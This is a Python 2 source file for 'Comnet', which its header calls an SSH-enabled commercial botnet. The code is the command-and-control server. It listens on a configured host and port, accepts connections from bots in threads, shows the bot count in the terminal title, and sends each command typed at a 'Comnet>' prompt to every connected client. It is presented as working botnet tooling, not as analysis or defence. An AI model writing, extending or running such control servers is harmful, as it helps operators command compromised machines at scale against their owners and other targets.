#!/usr/bin/env python
# -*- coding: utf-8 -*-

# !- Comnet - An SSH-enabled Commercial Botnet written in Python -!
# !- Written by Willy Fox (@BlackVikingPro) -!

import os, sys, time, socket, json, threading
from colorama import init
from termcolor import colored
from tqdm import tqdm

# use Colorama to make Termcolor work on Windows too
init()

# import/parse our json config file
with open("../core/config.json") as jsonConfig:
    config = json.load(jsonConfig)

# initiate connection object
sockConnObj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def usage():
    print colored("  ____                           _   ", "green")
    print colored(" / ___|___  _ __ ___  _ __   ___| |_ ", "red")
    print colored("| |   / _ \| '_ ` _ \| '_ \ / _ \ __|", "magenta")
    print colored("| |__| (_) | | | | | | | | |  __/ |_ ", "blue")
    print colored(" \____\___/|_| |_| |_|_| |_|\___|\__|", "yellow")
    print ""

    pass


# -- Start Functions --

def setTitle(title):
    sys.stdout.write("\x1b]2;%s\x07" % title)
    pass

def checkConnAvailability(listen_host, listen_port):
    try:
        sockConnObj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sockConnObj.bind((listen_host, listen_port))
        sockConnObj.listen(5)
        sys.stdout.write("yes.")
        sockConnObj.shutdown(0); sockConnObj.close();
        return True
        """
        connTestResult = sockConnObj.connect_ex((listen_host, listen_port))
        #sockConnObj.connect((listen_host, listen_port))
        if connTestResult == 0:
            sys.stdout.write("yes.")
            return True
        else:
            sys.stdout.write("no.")
            return False
        """
    except Exception, e:
        sys.stdout.write(colored("no. exception: %s" % str(e), "red", "on_green"))
        return False
    pass

class client(threading.Thread):
    def __init__(self, conn):
        super(client, self).__init__()
        self.conn = conn
        self.data = ""

    def run(self):
        while True:
            self.data = self.data + self.conn.recv(1024)
            if self.data.endswith(u"\r\n"):
                print self.data
                self.data = ""

    def send_msg(self,msg):
        self.conn.send(msg)

    def close(self):
        self.conn.close()

class connectionThread(threading.Thread):
    def __init__(self, host, port):
        super(connectionThread, self).__init__()
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.s.bind((host,port))
            self.s.listen(5)
        except socket.error, e:
            print 'Failed to create socket'
            print str(e)
            sys.exit()
        self.clients = []

    def run(self):
        clientCount = 0
        while True:
            conn, address = self.s.accept()
            c = client(conn)
            c.start()
            c.send_msg(u"\r\n")
            self.clients.append(c)
            clientCount += 1
            setTitle("! - Comnet Server : Connected Clients - %s - !" % clientCount)
            # print '[+] Client connected: {0}'.format(address[0])

def startListener(listen_host, listen_port):
    get_conns = connectionThread(listen_host, listen_port)
    get_conns.start()
    while True:
        try:
            response = raw_input("Comnet> ")
            for c in get_conns.clients:
                c.send_msg(response + u"\r\n")
        except Exception, e:
            print str(e)
        except KeyboardInterrupt:
            sys.exit()

def startComnetEngine():
    print colored("[!] Starting Comnet Engine", "green", "on_red"); print ""; time.sleep(.1)
    sys.stdout.write("\r" + colored("[+] Checking if {0}:{1} is usable.. ".format(config["server"]["listen_host"], config["server"]["listen_port"]), "yellow")); time.sleep(.1)

    # Check Connection Availability...
    isConnAva = checkConnAvailability(config["server"]["listen_host"], config["server"]["listen_port"]); sys.stdout.flush(); print ""
    if isConnAva:
        print colored("[+] Comnet is able to listen on {0}:{1}".format(config["server"]["listen_host"], config["server"]["listen_port"]), "green"); time.sleep(.1)
        print colored("[+] Comnet is starting listener on {0}:{1}\n".format(config["server"]["listen_host"], config["server"]["listen_port"]), "green"); time.sleep(.1)
        startListener(config["server"]["listen_host"], config["server"]["listen_port"])
    else:
        print colored("[-] Comnet is unable to listen on {0}:{1}\n".format(config["server"]["listen_host"], config["server"]["listen_port"]), "red"); time.sleep(.1)
        print colored("[-] Comnet is exiting... Goodbye!\n", "red"); sys.exit()
    pass

# -- End Functions --


if __name__ == '__main__':
    try:
        setTitle("! - Comnet Server - !")
        usage() # Display usage
        startComnetEngine() # Start Comnet Engine

        """
        # Lets start the engine
        for i in tqdm(range(100), ascii=True, desc="Starting Comnet Server"):
            if i == 1:
                startComnetEngine() # Start Comnet Engine
            time.sleep(.05) # Gives us about 5 seconds to open ports and start accepting connections from bots
        """
        pass
    except KeyError:
        pass
    except KeyboardInterrupt:
        print colored(" Caught.. exiting Comnet... Goodbye!", "red")
        pass
